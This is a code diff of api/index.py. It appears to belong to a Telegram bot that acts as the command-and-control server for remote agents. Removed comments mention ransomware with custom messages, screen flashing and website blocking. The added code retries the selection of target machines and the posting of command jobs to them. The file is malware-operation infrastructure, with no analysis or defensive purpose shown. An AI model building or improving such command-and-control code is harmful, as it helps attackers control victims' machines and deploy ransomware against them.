@@ -1,8 +1,3 @@
-# api/index.py
-# UPDATED: Help command now reflects all new agent features (TTS, Screen Flash, Website Block).
-# UPDATED: Ransomware help text now shows custom message capability.
-# ADDED: New commands registered with the generic command handler.
-
 import os
 import re
 import json
@@ -33,33 +28,61 @@ def esc(text):
     escape_chars = r'_*[]()~`>#+-=|{}.!'
     return re.sub(f'([{re.escape(escape_chars)}])', r'\\\1', str(text))
 
-async def get_state():
+async def get_state(retries=3, delay=2):
     async with httpx.AsyncClient() as client:
-        try:
-            res = await client.get(STATE_URL, timeout=5)
-            return res.json().get("selected_target", None)
-        except Exception: return None
+        for i in range(retries):
+            try:
+                res = await client.get(STATE_URL, timeout=5)
+                return res.json().get("selected_target", None)
+            except (httpx.ConnectTimeout, httpx.RequestError) as e:
+                print(f"Attempt {i + 1}/{retries}: Connection to {STATE_URL} failed: {e}")
+                if i < retries - 1:
+                    await asyncio.sleep(delay)
+            except Exception as e:
+                print(f"Unexpected error getting state: {e}")
+                return None
+        print(f"Failed to connect to {STATE_URL} after {retries} attempts.")
+        return None
 
-async def set_state(target_id):
+async def set_state(target_id, retries=3, delay=2):
     async with httpx.AsyncClient() as client:
-        try: await client.post(STATE_URL, json={"selected_target": target_id}, timeout=5)
-        except Exception as e: print(f"Error setting state: {e}")
+        for i in range(retries):
+            try:
+                await client.post(STATE_URL, json={"selected_target": target_id}, timeout=5)
+                return True
+            except (httpx.ConnectTimeout, httpx.RequestError) as e:
+                print(f"Attempt {i + 1}/{retries}: Error setting state: {e}")
+                if i < retries - 1:
+                    await asyncio.sleep(delay)
+            except Exception as e:
+                print(f"Unexpected error setting state: {e}")
+                return False
+        print(f"Failed to set state after {retries} attempts.")
+        return False
 
-async def post_job(target_id, command, args):
+async def post_job(target_id, command, args, retries=3, delay=2):
     job = {"job_id": str(uuid.uuid4()), "target_id": target_id, "command": command, "args": args}
     async with httpx.AsyncClient() as client:
-        try:
+        for i in range(retries):
             try:
-                res = await client.get(JOBS_URL, timeout=5)
-                current_jobs = res.json() if res.status_code == 200 and isinstance(res.json(), list) else []
-            except Exception: current_jobs = []
-            
-            current_jobs.append(job)
-            await client.post(JOBS_URL, json=current_jobs, timeout=5)
-            return True
-        except Exception as e:
-            print(f"Error posting job: {e}")
-            return False
+                try:
+                    res = await client.get(JOBS_URL, timeout=5)
+                    current_jobs = res.json() if res.status_code == 200 and isinstance(res.json(), list) else []
+                except Exception:
+                    current_jobs = []
+                
+                current_jobs.append(job)
+                await client.post(JOBS_URL, json=current_jobs, timeout=5)
+                return True
+            except (httpx.ConnectTimeout, httpx.RequestError) as e:
+                print(f"Attempt {i + 1}/{retries}: Error posting job: {e}")
+                if i < retries - 1:
+                    await asyncio.sleep(delay)
+            except Exception as e:
+                print(f"Unexpected error posting job: {e}")
+                return False
+        print(f"Failed to post job after {retries} attempts.")
+        return False
 
 # --- Telegram Command Handlers ---
 async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
